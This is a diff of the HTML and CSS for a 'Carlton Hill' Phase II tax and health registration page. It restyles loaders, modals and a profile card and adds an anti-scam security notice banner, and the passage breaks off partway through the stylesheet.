@@ -2,14 +2,14 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Carlton Hill · Phase II – Tax & Health Registration</title>
   <!-- Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
   <!-- Font Awesome -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <style>
-    /* reset & base */
+    /* reset & base - clean professional */
     * {
       margin: 0;
       padding: 0;
@@ -51,6 +51,103 @@
       --shadow-sm: 0 1px 2px 0 rgb(0 0 0 / 0.05);
       --shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1);
       --shadow-md: 0 6px 10px -1px rgb(0 0 0 / 0.1);
+      --shadow-lg: 0 10px 15px -3px rgb(0 0 0 / 0.1);
+    }
+
+    /* ===== FIXED LOADING SCREEN ===== */
+    .loading-screen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100vh;
+      background: white;
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: opacity 0.5s ease, visibility 0.5s ease;
+    }
+
+    .loading-screen.hidden {
+      opacity: 0;
+      visibility: hidden;
+    }
+
+    .loader-content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      width: 100%;
+      max-width: 300px;
+    }
+
+    .loading-spinner {
+      width: 48px;
+      height: 48px;
+      border: 3px solid var(--gray-200);
+      border-top-color: var(--accent);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin-bottom: 1.5rem;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .loading-text {
+      color: var(--gray-800);
+      font-size: 1rem;
+      font-weight: 500;
+      margin-bottom: 0.5rem;
+    }
+
+    .loading-subtext {
+      color: var(--gray-600);
+      font-size: 0.9rem;
+    }
+
+    /* ===== REDIRECT LOADER ===== */
+    .redirect-loader {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100vh;
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(4px);
+      z-index: 10000;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+
+    .redirect-loader.active {
+      display: flex;
+    }
+
+    .redirect-spinner {
+      width: 48px;
+      height: 48px;
+      border: 3px solid var(--gray-200);
+      border-top-color: var(--accent);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin-bottom: 1rem;
+    }
+
+    .redirect-text {
+      color: var(--gray-800);
+      font-size: 1.1rem;
+      font-weight: 500;
+      margin-bottom: 0.25rem;
+    }
+
+    .redirect-subtext {
+      color: var(--gray-600);
+      font-size: 0.9rem;
     }
 
     /* utility */
@@ -62,327 +159,10 @@
       flex: 1;
     }
 
-    /* navigation */
-    .navbar {
-      background: white;
-      border-bottom: 1px solid var(--border);
-      padding: 1rem 0;
-      width: 100%;
-    }
-
-    .nav-container {
-      max-width: 1280px;
-      margin: 0 auto;
-      padding: 0 2rem;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-    }
-
-    .logo {
-      font-weight: 700;
-      font-size: 1.3rem;
-      color: var(--primary);
-      letter-spacing: -0.02em;
-    }
-
-    .nav-links {
-      display: flex;
-      gap: 2rem;
-    }
-
-    .nav-links a {
-      text-decoration: none;
-      color: var(--gray-600);
-      font-size: 0.9rem;
-      font-weight: 500;
-      transition: color 0.2s;
-    }
-
-    .nav-links a:hover {
-      color: var(--primary);
-    }
-
-    .nav-links a.active {
-      color: var(--primary);
-      font-weight: 600;
-      border-bottom: 2px solid var(--accent);
-      padding-bottom: 0.25rem;
-    }
-
-    .mobile-menu-btn {
-      display: none;
-      font-size: 1.5rem;
-      background: none;
-      border: none;
-      color: var(--primary);
-      cursor: pointer;
-    }
-
-    /* mobile nav */
-    .mobile-nav {
-      position: fixed;
-      top: 0;
-      right: -280px;
-      width: 280px;
-      height: 100vh;
-      background: white;
-      padding: 2rem;
-      transition: right 0.3s ease;
-      z-index: 200;
-      box-shadow: -5px 0 30px rgba(0,0,0,0.1);
-    }
-
-    .mobile-nav.active {
-      right: 0;
-    }
-
-    .mobile-nav-close {
-      text-align: right;
-      font-size: 1.5rem;
-      margin-bottom: 2rem;
-      cursor: pointer;
-      color: var(--gray-600);
-    }
-
-    .mobile-nav a {
-      display: block;
-      padding: 1rem 0;
-      text-decoration: none;
-      color: var(--gray-700);
-      border-bottom: 1px solid var(--border);
-      font-size: 1rem;
-      transition: 0.2s;
-    }
-
-    .mobile-nav a:hover,
-    .mobile-nav a.active {
-      color: var(--primary);
-      padding-left: 0.5rem;
-    }
-
-    .overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100vh;
-      background: rgba(0,0,0,0.4);
-      opacity: 0;
-      visibility: hidden;
-      transition: 0.3s;
-      z-index: 150;
-      backdrop-filter: blur(3px);
-    }
-
-    .overlay.active {
-      opacity: 1;
-      visibility: visible;
-    }
-
-    /* alert / notification */
-    .alert {
-      position: fixed;
-      top: 1.5rem;
-      right: 1.5rem;
-      background: white;
-      border-left: 4px solid var(--success);
-      border-radius: 6px;
-      padding: 1rem 1.5rem;
-      box-shadow: var(--shadow-md);
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-      z-index: 1000;
-      transform: translateX(400px);
-      transition: transform 0.3s ease;
-      max-width: 400px;
-      width: calc(100% - 3rem);
-    }
-
-    .alert.show {
-      transform: translateX(0);
-    }
-
-    .alert i {
-      font-size: 1.3rem;
-      color: var(--success);
-      flex-shrink: 0;
-    }
-
-    .alert-content {
-      flex: 1;
-    }
-
-    .alert-title {
-      font-weight: 600;
-      color: var(--gray-900);
-      margin-bottom: 0.2rem;
-      font-size: 1rem;
-    }
-
-    .alert-message {
-      font-size: 0.9rem;
-      color: var(--gray-600);
-    }
-
-    .alert-close {
-      cursor: pointer;
-      color: var(--gray-400);
-      font-size: 1.2rem;
-      transition: color 0.2s;
-      flex-shrink: 0;
-    }
-
-    .alert-close:hover {
-      color: var(--danger);
-    }
-
-    /* loading overlay */
-    .loading-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100vh;
-      background: rgba(255,255,255,0.95);
-      backdrop-filter: blur(4px);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 2000;
-      flex-direction: column;
-    }
-
-    .loading-overlay.active {
-      display: flex;
-    }
-
-    .loading-spinner {
-      width: 40px;
-      height: 40px;
-      border: 3px solid var(--gray-200);
-      border-top-color: var(--accent);
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-      margin-bottom: 1rem;
-    }
-
-    .loading-text {
-      color: var(--gray-700);
-      font-size: 0.95rem;
-      font-weight: 500;
-    }
-
-    @keyframes spin { to { transform: rotate(360deg); } }
-
-    /* success modal */
-    .modal {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100vh;
-      background: rgba(0,0,0,0.5);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 2000;
-      padding: 1rem;
-    }
-
-    .modal.active {
-      display: flex;
-    }
-
-    .modal-card {
-      background: white;
-      border-radius: 16px;
-      padding: 2rem;
-      max-width: 400px;
-      width: 100%;
-      text-align: center;
-      box-shadow: var(--shadow-md);
-      animation: slideUp 0.3s ease;
-    }
-
-    @keyframes slideUp {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    .modal-icon {
-      width: 56px;
-      height: 56px;
-      background: var(--success-light);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin: 0 auto 1.25rem;
-    }
-
-    .modal-icon i {
-      font-size: 1.8rem;
-      color: var(--success);
-    }
-
-    .modal-card h3 {
-      font-size: 1.4rem;
-      font-weight: 600;
-      color: var(--gray-900);
-      margin-bottom: 0.5rem;
-    }
-
-    .modal-card p {
-      color: var(--gray-600);
-      margin-bottom: 1.5rem;
-      font-size: 0.95rem;
-    }
-
-    .modal-divider {
-      width: 40px;
-      height: 3px;
-      background: var(--accent);
-      margin: 1.5rem auto;
-      border-radius: 3px;
-    }
-
-    .modal-note {
-      background: var(--gray-50);
-      padding: 1rem;
-      border-radius: 8px;
-      color: var(--gray-700);
-      font-size: 0.9rem;
-      margin-bottom: 1.5rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0.5rem;
-    }
-
-    .modal-btn {
-      background: var(--accent);
-      color: white;
-      border: none;
-      padding: 0.75rem 1.5rem;
-      border-radius: 6px;
-      font-weight: 500;
-      cursor: pointer;
-      transition: 0.2s;
-      width: 100%;
-      max-width: 200px;
-      margin: 0 auto;
-      font-size: 0.95rem;
-    }
-
-    .modal-btn:hover {
-      background: var(--primary);
-    }
-
-    /* page header */
+    /* ===== SIMPLE HEADER ===== */
     .page-header {
-      padding: 2.5rem 0 1rem;
+      padding: 2.5rem 0 1.5rem;
+      text-align: center;
     }
 
     .page-header h1 {
@@ -397,17 +177,23 @@
       color: var(--gray-600);
       max-width: 600px;
       font-size: 0.95rem;
+      margin: 0 auto;
     }
 
     /* progress bar */
     .progress {
-      margin: 2rem 0;
+      margin: 1rem 0 2rem;
+      background: white;
+      border-radius: 12px;
+      padding: 1.5rem;
+      box-shadow: var(--shadow-sm);
+      border: 1px solid var(--border);
     }
 
     .progress-labels {
       display: flex;
       justify-content: space-between;
-      margin-bottom: 0.5rem;
+      margin-bottom: 1rem;
       flex-wrap: wrap;
       gap: 0.5rem;
     }
@@ -415,7 +201,6 @@
     .progress-label {
       font-size: 0.85rem;
       color: var(--gray-600);
-      position: relative;
       display: flex;
       align-items: center;
       gap: 0.3rem;
@@ -431,11 +216,12 @@
     }
 
     .progress-bar {
-      height: 4px;
+      height: 6px;
       background: var(--gray-200);
       border-radius: 100px;
       position: relative;
       overflow: hidden;
+      margin-bottom: 1.5rem;
     }
 
     .progress-fill {
@@ -449,67 +235,323 @@
       transition: width 0.3s ease;
     }
 
-    /* user card */
-    .user-card {
-      background: white;
+    /* Phase I Preview Button */
+    .phase-preview-btn {
+      background: var(--gray-50);
       border: 1px solid var(--border);
-      border-radius: 12px;
-      padding: 1.5rem;
-      margin-bottom: 2rem;
-      display: flex;
+      border-radius: 8px;
+      padding: 0.75rem 1rem;
+      display: inline-flex;
       align-items: center;
-      gap: 1rem;
-      flex-wrap: wrap;
-      box-shadow: var(--shadow-sm);
+      gap: 0.75rem;
+      cursor: pointer;
+      transition: all 0.2s;
+      width: 100%;
     }
 
-    .user-avatar {
-      width: 48px;
-      height: 48px;
+    .phase-preview-btn:hover {
       background: var(--primary-light);
-      border-radius: 12px;
+      border-color: var(--accent);
+    }
+
+    .phase-preview-btn i {
+      color: var(--accent);
+      font-size: 1.1rem;
+    }
+
+    .phase-preview-btn span {
+      flex: 1;
+      text-align: left;
+      color: var(--gray-700);
+      font-size: 0.9rem;
+    }
+
+    .phase-preview-btn .arrow {
+      color: var(--gray-500);
+      font-size: 0.9rem;
+      transition: transform 0.2s;
+    }
+
+    .phase-preview-btn:hover .arrow {
+      transform: translateX(3px);
+      color: var(--accent);
+    }
+
+    /* ===== ENHANCED USER PROFILE CARD ===== */
+    .profile-card {
+      background: white;
+      border-radius: 16px;
+      padding: 2rem;
+      margin-bottom: 2rem;
+      box-shadow: var(--shadow-sm);
+      border: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      gap: 1.5rem;
+      flex-wrap: wrap;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .profile-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 4px;
+      background: linear-gradient(90deg, var(--primary), var(--accent));
+    }
+
+    .profile-avatar {
+      width: 80px;
+      height: 80px;
+      background: linear-gradient(135deg, var(--primary-light), var(--primary));
+      border-radius: 50%;
       display: flex;
       align-items: center;
       justify-content: center;
-      color: var(--primary);
-      font-size: 1.3rem;
+      color: white;
+      font-size: 2rem;
+      box-shadow: 0 4px 10px rgba(11, 79, 60, 0.2);
+      border: 3px solid white;
     }
 
-    .user-info {
+    .profile-info {
       flex: 1;
-      min-width: 200px;
+      min-width: 250px;
     }
 
-    .user-info h2 {
-      font-size: 1.2rem;
+    .profile-info h2 {
+      font-size: 1.5rem;
       font-weight: 600;
       color: var(--gray-900);
       margin-bottom: 0.25rem;
     }
 
-    .user-info p {
-      color: var(--gray-600);
-      font-size: 0.9rem;
+    .profile-details {
       display: flex;
-      align-items: center;
-      gap: 0.75rem;
       flex-wrap: wrap;
+      gap: 1rem 2rem;
+      margin-top: 0.5rem;
     }
 
-    .badge {
-      background: var(--primary-light);
-      color: var(--primary);
-      padding: 0.3rem 0.75rem;
+    .profile-detail-item {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      color: var(--gray-600);
+      font-size: 0.9rem;
+    }
+
+    .profile-detail-item i {
+      color: var(--accent);
+      width: 16px;
+    }
+
+    .profile-badge {
+      background: var(--success-light);
+      color: var(--success);
+      padding: 0.4rem 1rem;
       border-radius: 100px;
-      font-size: 0.8rem;
+      font-size: 0.85rem;
       font-weight: 500;
       display: inline-flex;
       align-items: center;
-      gap: 0.3rem;
-      border: 1px solid var(--primary);
+      gap: 0.5rem;
+      border: 1px solid var(--success);
+      white-space: nowrap;
     }
 
-    /* form card */
+    /* ===== PHASE I PREVIEW MODAL ===== */
+    .phase-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100vh;
+      background: rgba(0,0,0,0.5);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 2000;
+      padding: 1rem;
+      backdrop-filter: blur(4px);
+    }
+
+    .phase-modal.active {
+      display: flex;
+    }
+
+    .phase-modal-content {
+      background: white;
+      border-radius: 20px;
+      max-width: 500px;
+      width: 100%;
+      max-height: 80vh;
+      overflow-y: auto;
+      box-shadow: var(--shadow-lg);
+      animation: modalSlide 0.3s ease;
+    }
+
+    @keyframes modalSlide {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .phase-modal-header {
+      padding: 1.5rem 2rem;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: linear-gradient(135deg, var(--primary-light), white);
+    }
+
+    .phase-modal-header h3 {
+      font-size: 1.2rem;
+      font-weight: 600;
+      color: var(--primary);
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .phase-modal-header h3 i {
+      color: var(--accent);
+    }
+
+    .phase-modal-close {
+      background: none;
+      border: none;
+      font-size: 1.5rem;
+      color: var(--gray-600);
+      cursor: pointer;
+      transition: color 0.2s;
+    }
+
+    .phase-modal-close:hover {
+      color: var(--danger);
+    }
+
+    .phase-modal-body {
+      padding: 2rem;
+    }
+
+    .phase-info-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1.5rem;
+      margin-bottom: 2rem;
+    }
+
+    .phase-info-item {
+      background: var(--gray-50);
+      border-radius: 12px;
+      padding: 1.2rem;
+      border: 1px solid var(--border);
+    }
+
+    .phase-info-item h4 {
+      font-size: 0.85rem;
+      color: var(--gray-600);
+      margin-bottom: 0.75rem;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .phase-info-content {
+      display: flex;
+      flex-direction: column;
+      gap: 0.75rem;
+    }
+
+    .info-row {
+      display: flex;
+      align-items: flex-start;
+      gap: 0.5rem;
+    }
+
+    .info-row i {
+      color: var(--accent);
+      width: 18px;
+      font-size: 0.9rem;
+      margin-top: 0.1rem;
+    }
+
+    .info-row span {
+      flex: 1;
+      font-size: 0.95rem;
+      color: var(--gray-800);
+      word-break: break-word;
+    }
+
+    .work-preference-card {
+      background: var(--primary-light);
+      border-radius: 12px;
+      padding: 1.2rem;
+      margin-bottom: 1.5rem;
+      border: 1px solid var(--primary);
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+    }
+
+    .work-preference-icon {
+      width: 48px;
+      height: 48px;
+      background: white;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--primary);
+      font-size: 1.5rem;
+    }
+
+    .work-preference-details {
+      flex: 1;
+    }
+
+    .work-preference-details h5 {
+      font-size: 0.9rem;
+      color: var(--gray-700);
+      margin-bottom: 0.25rem;
+    }
+
+    .work-preference-details p {
+      font-weight: 600;
+      color: var(--primary);
+    }
+
+    .phase-modal-footer {
+      padding: 1.5rem 2rem;
+      border-top: 1px solid var(--border);
+      text-align: right;
+    }
+
+    .modal-primary-btn {
+      background: var(--primary);
+      color: white;
+      border: none;
+      padding: 0.8rem 2rem;
+      border-radius: 8px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    .modal-primary-btn:hover {
+      background: var(--primary-dark);
+    }
+
+    /* ===== FORM CARD ===== */
     .form-card {
       background: white;
       border: 1px solid var(--border);
@@ -655,7 +697,6 @@
       align-items: center;
       gap: 0.5rem;
       cursor: pointer;
-      padding: 0.25rem 0;
     }
 
     .radio-option input[type="radio"] {
@@ -764,11 +805,6 @@
       background: var(--danger-light);
     }
 
-    /* hidden fields for FormSubmit */
-    .hidden-field {
-      display: none;
-    }
-
     /* declaration */
     .declaration {
       background: var(--gray-50);
@@ -790,7 +826,6 @@
       color: var(--accent);
       font-size: 1rem;
       flex-shrink: 0;
-      margin-top: 0.1rem;
     }
 
     .checkbox {
@@ -934,6 +969,179 @@
       color: var(--gray-800);
     }
 
+    /* success modal with loading button */
+    .modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100vh;
+      background: rgba(0,0,0,0.5);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 2000;
+      padding: 1rem;
+    }
+
+    .modal.active {
+      display: flex;
+    }
+
+    .modal-card {
+      background: white;
+      border-radius: 16px;
+      padding: 2rem;
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+      box-shadow: var(--shadow-md);
+      animation: slideUp 0.3s ease;
+    }
+
+    .modal-icon {
+      width: 56px;
+      height: 56px;
+      background: var(--success-light);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 1.25rem;
+    }
+
+    .modal-icon i {
+      font-size: 1.8rem;
+      color: var(--success);
+    }
+
+    .modal-card h3 {
+      font-size: 1.4rem;
+      font-weight: 600;
+      color: var(--gray-900);
+      margin-bottom: 0.5rem;
+    }
+
+    .modal-card p {
+      color: var(--gray-600);
+      margin-bottom: 1.5rem;
+      font-size: 0.95rem;
+    }
+
+    .modal-divider {
+      width: 40px;
+      height: 3px;
+      background: var(--accent);
+      margin: 1.5rem auto;
+      border-radius: 3px;
+    }
+
+    .modal-note {
+      background: var(--gray-50);
+      padding: 1rem;
+      border-radius: 8px;
+      color: var(--gray-700);
+      font-size: 0.9rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .modal-btn {
+      background: var(--accent);
+      color: white;
+      border: none;
+      padding: 0.9rem 1.5rem;
+      border-radius: 6px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+      width: 100%;
+      max-width: 250px;
+      margin: 0 auto;
+      font-size: 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+    }
+
+    .modal-btn:hover {
+      background: var(--primary);
+    }
+
+    .modal-btn.loading {
+      position: relative;
+      color: transparent;
+      pointer-events: none;
+    }
+
+    .modal-btn.loading::after {
+      content: '';
+      position: absolute;
+      width: 18px;
+      height: 18px;
+      border: 2px solid white;
+      border-top-color: transparent;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    /* alert */
+    .alert {
+      position: fixed;
+      top: 1.5rem;
+      right: 1.5rem;
+      background: white;
+      border-left: 4px solid var(--success);
+      border-radius: 6px;
+      padding: 1rem 1.5rem;
+      box-shadow: var(--shadow-md);
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      z-index: 1000;
+      transform: translateX(400px);
+      transition: transform 0.3s ease;
+      max-width: 400px;
+      width: calc(100% - 3rem);
+    }
+
+    .alert.show {
+      transform: translateX(0);
+    }
+
+    .alert i {
+      font-size: 1.3rem;
+      color: var(--success);
+      flex-shrink: 0;
+    }
+
+    .alert-content {
+      flex: 1;
+    }
+
+    .alert-title {
+      font-weight: 600;
+      color: var(--gray-900);
+      margin-bottom: 0.2rem;
+      font-size: 1rem;
+    }
+
+    .alert-message {
+      font-size: 0.9rem;
+      color: var(--gray-600);
+    }
+
+    .alert-close {
+      cursor: pointer;
+      color: var(--gray-400);
+      font-size: 1.2rem;
+      transition: color 0.2s;
+    }
+
+    .alert-close:hover {
+      color: var(--danger);
+    }
+
     /* footer */
     footer {
       background: white;
@@ -947,12 +1155,6 @@
 
     /* responsive */
     @media (max-width: 768px) {
-      .nav-links {
-        display: none;
-      }
-      .mobile-menu-btn {
-        display: block;
-      }
       .grid-2 {
         grid-template-columns: 1fr;
       }
@@ -969,37 +1171,511 @@
         flex-direction: column;
         gap: 0.5rem;
       }
-      .user-card {
+      .profile-card {
         flex-direction: column;
         text-align: center;
       }
-      .user-info p {
+      .profile-details {
         justify-content: center;
       }
       .page-header h1 {
         font-size: 1.5rem;
       }
-    }
-
-    @media (max-width: 480px) {
-      .form-card {
-        padding: 1.25rem;
-      }
-      .conditional-section {
-        padding: 1rem;
-      }
-      .alert {
-        top: 1rem;
-        right: 1rem;
-        left: 1rem;
-        width: auto;
+      .phase-info-grid {
+        grid-template-columns: 1fr;
       }
     }
   </style>
 </head>
 <body>
+  <!-- SCAM ALERT - Add this right after <body> tag -->
+<div id="scamAlert" class="scam-alert-mini">
+  <div class="scam-alert-mini-content" onclick="expandScamAlert()">
+    <i class="fas fa-shield-alt"></i>
+    <span>Security Notice</span>
+    <i class="fas fa-chevron-up"></i>
+  </div>
+</div>
 
-<!-- Alert (only shows for errors and success) -->
+<div id="scamAlertFull" class="scam-alert-full">
+  <div class="scam-alert-full-content">
+    <button class="scam-alert-full-close" onclick="minimizeScamAlert()">
+      <i class="fas fa-chevron-down"></i>
+    </button>
+    
+    <div class="scam-alert-full-header">
+      <div class="scam-alert-full-icon">
+        CH
+      </div>
+      <h3>⚠️ Official Security Notice</h3>
+    </div>
+    
+    <div class="scam-alert-full-body">
+      <div class="scam-alert-message">
+        <p class="scam-alert-intro">
+          <i class="fas fa-check-circle"></i> 
+          <strong>Carlton Hill Station Farm</strong> wants to ensure your safety:
+        </p>
+        
+        <div class="scam-alert-highlight">
+          <i class="fas fa-exclamation-triangle"></i>
+          <p>All applications and submissions must be made <strong>only through our official website</strong>.</p>
+        </div>
+        
+        <div class="scam-alert-warning">
+          <i class="fas fa-phone-slash"></i>
+          <p>We <strong>do not call</strong> individuals to request applications, payments, or personal information.</p>
+        </div>
+        
+        <div class="scam-alert-rule">
+          <p>📞 If you receive any phone call claiming to represent Carlton Hill Station Farm and asking you to submit information or make payments outside this website, <span class="scam-alert-danger">please treat it as a scam</span>.</p>
+        </div>
+        
+        <div class="scam-alert-safety">
+          <i class="fas fa-lock"></i>
+          <p>For your safety, only trust communication made through this official website or from verified contacts of Carlton Hill Station Farm.</p>
+        </div>
+        
+        <div class="scam-alert-thankyou">
+          <i class="fas fa-heart"></i>
+          <p>Thank you for helping us maintain a safe and transparent process. 🚜</p>
+        </div>
+      </div>
+    </div>
+    
+    <div class="scam-alert-full-footer">
+      <div class="scam-alert-verified">
+        <i class="fas fa-check-circle"></i> Verified Official Notice
+      </div>
+      <div class="scam-alert-timestamp" id="scamAlertTimestamp"></div>
+    </div>
+  </div>
+</div>
+
+<style>
+  /* Scam Alert Styles - Matches Carlton Hill design system */
+  .scam-alert-mini {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    z-index: 9998;
+    animation: slideUp 0.5s ease;
+  }
+
+  @keyframes slideUp {
+    from {
+      opacity: 0;
+      transform: translateY(20px);
+    }
+    to {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+
+  .scam-alert-mini-content {
+    background: var(--primary, #1a3a2a);
+    color: var(--accent, #c49a6b);
+    padding: 12px 20px;
+    border-radius: 50px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    cursor: pointer;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+    border: 1px solid var(--accent-light, #dbb68c);
+    font-weight: 500;
+    transition: all 0.3s ease;
+  }
+
+  .scam-alert-mini-content:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 8px 25px rgba(0,0,0,0.25);
+    background: var(--primary-light, #2d5a3d);
+  }
+
+  .scam-alert-mini-content i:first-child {
+    color: var(--accent, #c49a6b);
+    font-size: 1.2rem;
+    animation: gentlePulse 2s infinite;
+  }
+
+  @keyframes gentlePulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.7; }
+  }
+
+  .scam-alert-mini-content i:last-child {
+    font-size: 0.9rem;
+    opacity: 0.8;
+  }
+
+  /* Full Alert */
+  .scam-alert-full {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    z-index: 9999;
+    opacity: 0;
+    visibility: hidden;
+    transform: scale(0.8);
+    transition: all 0.3s ease;
+    max-width: 450px;
+    width: calc(100% - 40px);
+  }
+
+  .scam-alert-full.active {
+    opacity: 1;
+    visibility: visible;
+    transform: scale(1);
+  }
+
+  .scam-alert-full-content {
+    background: var(--light, #f9f6ef);
+    border: 2px solid var(--accent, #c49a6b);
+    border-radius: 20px;
+    padding: 1.8rem;
+    box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+    position: relative;
+    animation: expandIn 0.4s ease;
+  }
+
+  @keyframes expandIn {
+    from {
+      opacity: 0;
+      transform: scale(0.9) translateY(10px);
+    }
+    to {
+      opacity: 1;
+      transform: scale(1) translateY(0);
+    }
+  }
+
+  .scam-alert-full-close {
+    position: absolute;
+    top: 15px;
+    right: 15px;
+    background: none;
+    border: none;
+    color: var(--gray-dark, #8b9a8b);
+    cursor: pointer;
+    font-size: 1.2rem;
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: all 0.2s;
+  }
+
+  .scam-alert-full-close:hover {
+    background: var(--accent-light, #dbb68c);
+    color: var(--primary, #1a3a2a);
+  }
+
+  .scam-alert-full-header {
+    display: flex;
+    align-items: center;
+    gap: 15px;
+    margin-bottom: 20px;
+    padding-right: 30px;
+  }
+
+  .scam-alert-full-icon {
+    width: 50px;
+    height: 50px;
+    background: var(--primary-light, #e8f0ec);
+    border-radius: 15px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: var(--accent, #c49a6b);
+    font-size: 1.8rem;
+  }
+
+  .scam-alert-full-header h3 {
+    font-family: 'Playfair Display', serif;
+    color: var(--primary, #1a3a2a);
+    font-size: 1.3rem;
+    font-weight: 600;
+    margin: 0;
+  }
+
+  .scam-alert-full-body {
+    margin-bottom: 20px;
+    max-height: 350px;
+    overflow-y: auto;
+    padding-right: 5px;
+    scrollbar-width: thin;
+    scrollbar-color: var(--accent, #c49a6b) var(--gray, #eae7de);
+  }
+
+  .scam-alert-full-body::-webkit-scrollbar {
+    width: 6px;
+  }
+
+  .scam-alert-full-body::-webkit-scrollbar-track {
+    background: var(--gray, #eae7de);
+    border-radius: 10px;
+  }
+
+  .scam-alert-full-body::-webkit-scrollbar-thumb {
+    background: var(--accent, #c49a6b);
+    border-radius: 10px;
+  }
+
+  .scam-alert-message {
+    display: flex;
+    flex-direction: column;
+    gap: 16px;
+  }
+
+  .scam-alert-intro {
+    color: var(--dark, #162015);
+    font-size: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding-bottom: 8px;
+    border-bottom: 1px dashed var(--gray, #eae7de);
+  }
+
+  .scam-alert-intro i {
+    color: var(--success, #4caf50);
+  }
+
+  .scam-alert-highlight {
+    background: var(--primary-light, #e8f0ec);
+    padding: 15px;
+    border-radius: 12px;
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    border-left: 4px solid var(--accent, #c49a6b);
+  }
+
+  .scam-alert-highlight i {
+    color: var(--accent, #c49a6b);
+    font-size: 1.2rem;
+    margin-top: 2px;
+  }
+
+  .scam-alert-highlight p {
+    margin: 0;
+    color: var(--dark, #162015);
+    line-height: 1.5;
+  }
+
+  .scam-alert-warning {
+    background: var(--warning-light, #fff3e0);
+    padding: 15px;
+    border-radius: 12px;
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    border-left: 4px solid var(--warning, #ff9800);
+  }
+
+  .scam-alert-warning i {
+    color: var(--warning, #ff9800);
+    font-size: 1.2rem;
+    margin-top: 2px;
+  }
+
+  .scam-alert-warning p {
+    margin: 0;
+    color: var(--dark, #162015);
+  }
+
+  .scam-alert-rule {
+    background: var(--light, #f9f6ef);
+    padding: 15px;
+    border-radius: 12px;
+    border: 1px solid var(--gray, #eae7de);
+  }
+
+  .scam-alert-rule p {
+    margin: 0;
+    color: var(--dark, #162015);
+    line-height: 1.6;
+  }
+
+  .scam-alert-danger {
+    color: var(--danger, #b04a4a);
+    font-weight: 600;
+    background: var(--danger-light, #fef2f2);
+    padding: 2px 8px;
+    border-radius: 4px;
+  }
+
+  .scam-alert-safety {
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    padding: 10px;
+  }
+
+  .scam-alert-safety i {
+    color: var(--success, #4caf50);
+    font-size: 1.2rem;
+    margin-top: 2px;
+  }
+
+  .scam-alert-safety p {
+    margin: 0;
